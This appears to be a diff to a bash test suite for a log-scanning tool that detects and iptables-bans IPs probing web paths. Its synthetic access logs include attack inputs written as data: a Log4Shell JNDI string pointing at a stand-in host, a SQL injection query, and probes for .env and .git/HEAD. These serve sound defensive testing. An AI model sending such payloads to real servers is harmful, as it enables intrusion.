@@ -314,7 +314,7 @@ run_tests() {
 EOF
 
   if [ "$bash_assoc_ok" = "1" ]; then
-    run_isolated "$out5" --log-dir "$synth_dir" --threshold 5 --window 30
+    run_isolated "$out5" --log-dir "$synth_dir" --threshold 5 --window 30 --history
     if [ "$?" -eq 0 ]; then
       has_php_suspect="$(grep -F 'IP suspecte : 20.220.232.240' "$out5" || true)"
       if [ -n "$has_php_suspect" ]; then
@@ -357,14 +357,20 @@ has_rule() {
   "$1" -w -S BAN-PATH-EXPLORER 2>/dev/null | grep -q -- "-s $2"
 }
 
+# Horodatages des logs synthétiques : "minute" m = il y a (10 - m) minutes (m négatif = plus ancien)
+ts_of() {
+  echo $(( $(date +%s) - (10 - $1) * 60 ))
+}
+
 php_err() {
   # php_err IP chemin minute
-  printf "[Mon Apr 06 18:%02d:00.000000 2026] [php7:error] [pid 1:tid 1] [client %s] script '/var/www/site/%s' not found or unable to stat\n" "$3" "$1" "$2"
+  printf "[%s] [php7:error] [pid 1:tid 1] [client %s] script '/var/www/site/%s' not found or unable to stat\n" \
+    "$(LC_ALL=C date -d "@$(ts_of "$3")" '+%a %b %d %H:%M:%S.000000 %Y')" "$1" "$2"
 }
 
 acc() {
   # acc IP minute "METHODE URL" statut
-  printf '%s - - [06/Apr/2026:18:%02d:00 +0000] "%s HTTP/1.1" %s 123 "-" "Mozilla/5.0"\n' "$1" "$2" "$3" "$4"
+  printf '%s - - [%s] "%s HTTP/1.1" %s 123 "-" "Mozilla/5.0"\n' "$1" "$(LC_ALL=C date -d "@$(ts_of "$2")" '+%d/%b/%Y:%H:%M:%S %z')" "$3" "$4"
 }
 
 run_access_tests() {
@@ -405,7 +411,7 @@ run_access_tests() {
   {
     acc 198.51.100.20 1 "GET /.env" 404
     acc 198.51.100.21 1 'GET /?q=1%20UNION%20SELECT%20pass' 200
-    printf '%s - - [06/Apr/2026:18:01:00 +0000] "GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://x.example/a}"\n' 198.51.100.22
+    printf '%s - - [%s] "GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://x.example/a}"\n' 198.51.100.22 "$(LC_ALL=C date -d "@$(ts_of 1)" '+%d/%b/%Y:%H:%M:%S %z')"
     acc 198.51.100.23 1 "GET /blog/env-config" 200
   } > "$d/site_access.log"
   php_err "198.51.100.24:999" ".git/HEAD" 1 > "$d/error.log"
@@ -469,6 +475,27 @@ run_ban_tests() {
 
   # #10 : aucun fichier de travail prévisible ni résidu après exécution
   ban_check "Sécu #10 (aucun résidu /tmp ni fichier d'état temporaire)" bash -c "! ls -d /tmp/ban-path-explorer.* '$TMP_BAN_STATE'.?????? 2>/dev/null | grep -q ."
+
+  # #7 : un scan vieux de 2 h est ignoré (sauf --history), et un ban en cours n'est ni
+  # prolongé ni re-journalisé à chaque cycle tant que l'IP ne revient pas
+  reset_bans
+  for i in 1 2 3 4 5 6; do acc 198.51.100.30 $((i - 120)) "GET /old$i.php" 404; done > "$d/site_access.log"
+  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
+  ban_check "Fenêtre #7 (vieux scan ignoré)" bash -c "! grep -q 198.51.100.30 '$out'"
+  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30 --history
+  ban_check "Fenêtre #7 (--history le détecte)" grep -qx 'IP suspecte : 198.51.100.30' "$out"
+  for i in 1 2 3 4 5 6; do acc 198.51.100.31 "$i" "GET /new$i.php" 404; done > "$d/site_access.log"
+  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
+  cp "$TMP_BAN_STATE" "$TMP_DIR/state.before"
+  : > "$TMP_TRACK_LOG"
+  sleep 1
+  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
+  ban_check "Fenêtre #7 (ban non prolongé au cycle suivant)" cmp -s "$TMP_BAN_STATE" "$TMP_DIR/state.before"
+  ban_check "Fenêtre #7 (aucune ligne IP suspecte re-journalisée)" bash -c "! grep -q 'IP suspecte\|IP bannie' '$TMP_TRACK_LOG'"
+  : > "$TMP_TRACK_LOG"
+  BAN_PATH_FOLLOW_CHILD=1 run_isolated "$out" --log-dir "$d" --threshold 5 --ban
+  ban_check "Fenêtre #7 (cycle --follow sans événement = log vide)" bash -c "[ ! -s '$TMP_TRACK_LOG' ]"
+  rm -f "$d/site_access.log"
 
   # #2 : une signature déclenche le ban iptables sans seuil
   reset_bans
